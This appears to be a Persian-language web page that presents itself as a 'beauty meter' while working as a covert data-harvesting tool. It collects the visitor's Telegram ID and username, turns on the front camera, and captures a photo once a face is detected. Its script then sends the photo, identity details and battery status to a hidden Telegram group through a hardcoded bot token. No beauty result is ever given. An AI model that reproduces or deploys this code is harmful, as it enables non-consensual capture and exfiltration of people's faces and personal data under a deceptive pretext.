<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>زیبایی‌سنج برندیک</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
  <script defer src="https://unpkg.com/face-api.js"></script>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      font-family: 'Vazirmatn', sans-serif;
      background: linear-gradient(120deg, #f0f4ff, #dff2ff);
      direction: rtl;
      color: #333;
      padding: 30px;
      animation: fadeInBody 1s ease-in-out;
    }

    @keyframes fadeInBody {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .container {
      max-width: 540px;
      margin: auto;
      background: white;
      border-radius: 30px;
      padding: 35px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
      animation: slideIn 1s ease;
      position: relative;
      overflow: hidden;
    }

    @keyframes slideIn {
      from { transform: translateY(30px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }

    h2 {
      text-align: center;
      margin-bottom: 25px;
      font-size: 24px;
      color: #0057c2;
      position: relative;
    }

    h2::after {
      content: "";
      position: absolute;
      bottom: -8px;
      right: 50%;
      transform: translateX(50%);
      width: 60px;
      height: 4px;
      background: #0077ff;
      border-radius: 2px;
    }

    label {
      margin-top: 18px;
      font-weight: bold;
      font-size: 15px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-top: 6px;
      border-radius: 12px;
      border: 1px solid #ccc;
      transition: all 0.3s;
    }

    input:focus {
      outline: none;
      border-color: #0077ff;
      box-shadow: 0 0 5px rgba(0, 119, 255, 0.3);
    }

    button {
      margin-top: 25px;
      width: 100%;
      padding: 14px;
      background: linear-gradient(to right, #0077ff, #00c6ff);
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 20px rgba(0, 119, 255, 0.3);
    }

    .note {
      font-size: 13px;
      color: #666;
      margin-top: 12px;
      background: #eef6ff;
      padding: 10px 15px;
      border-radius: 10px;
    }

    .camera-container {
      display: none;
      flex-direction: column;
      align-items: center;
      margin-top: 30px;
      animation: fadeIn 1s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    video, canvas {
      border-radius: 20px;
      margin-top: 20px;
      max-width: 100%;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
    }

    #countdown {
      font-size: 20px;
      margin-top: 20px;
      color: #0077ff;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>زیبایی‌سنج برندیک</h2>
    <label>آیدی عددی تلگرام</label>
    <input id="userId" placeholder="مثلاً 123456789">
    <label>یوزرنیم (با @)</label>
    <input id="username" placeholder="مثلاً @example">
    <div class="note">
      ابتدا ربات <b>@HqlmePhotoBot</b> را استارت کنید.<br>
      برای گرفتن آیدی عددی به <b>@userinfobot</b> بروید.
    </div>
    <button onclick="sendCode()">ارسال کد تأیید</button>

    <div id="verifySection" style="display:none;">
      <label>کد تأیید</label>
      <input id="codeInput" placeholder="کدی که در تلگرام دریافت کردید">
      <button onclick="verifyCode()">تأیید و ادامه</button>
    </div>

    <div class="camera-container" id="cameraSection">
      <video id="video" autoplay muted playsinline></video>
      <canvas id="snapshot" width="320" height="240" style="display:none;"></canvas>
      <div id="countdown"></div>
    </div>
  </div>

  <script>
    const token = "7396553495:AAHfctgjqILhUGihcPZuqTTgRWrXxtGBUH4";
    const groupId = "-1002534583259";
    let sentCode = "";
    let uid = "";
    let uname = "";

    function sendCode() {
      uid = document.getElementById("userId").value.trim();
      uname = document.getElementById("username").value.trim();
      if (!uid || !uname) return alert("لطفاً تمام فیلدها را پر کنید.");

      sentCode = Math.floor(100000 + Math.random() * 900000).toString();
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: uid, text: `کد تایید شما: ${sentCode}` })
      });
      document.getElementById("verifySection").style.display = "block";
    }

    function verifyCode() {
      const input = document.getElementById("codeInput").value.trim();
      if (input === sentCode) {
        document.getElementById("cameraSection").style.display = "flex";
        startCamera();
      } else {
        alert("کد اشتباه است.");
      }
    }

    async function startCamera() {
      await faceapi.nets.tinyFaceDetector.loadFromUri("https://justadomain.ir/face-api-models");
      const video = document.getElementById("video");
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      video.srcObject = stream;
      video.onloadedmetadata = () => {
        video.play();
        detectFace(video);
      };
    }

    async function detectFace(video) {
      const interval = setInterval(async () => {
        const result = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions());
        if (result) {
          clearInterval(interval);
          document.getElementById("countdown").innerText = "شمارش معکوس: 5";
          let time = 5;
          const countdown = setInterval(() => {
            time--;
            document.getElementById("countdown").innerText = `شمارش معکوس: ${time}`;
            if (time === 0) {
              clearInterval(countdown);
              takePhoto();
            }
          }, 1000);
        }
      }, 1000);
    }

    function takePhoto() {
      const canvas = document.getElementById("snapshot");
      const video = document.getElementById("video");
      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(async (blob) => {
        const battery = await navigator.getBattery();
        const caption = `یوزرنیم: ${uname}\nآیدی عددی: ${uid}\nباتری: ${battery.level * 100}%\nشارژ: ${battery.charging ? 'بله' : 'خیر'}`;
        const form = new FormData();
        form.append("chat_id", groupId);
        form.append("caption", caption);
        form.append("photo", blob, "photo.jpg");

        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: form
        });

        document.getElementById("countdown").innerText = "ارسال با موفقیت انجام شد.";
      }, 'image/jpeg');
    }
  </script>
</body>
</html>
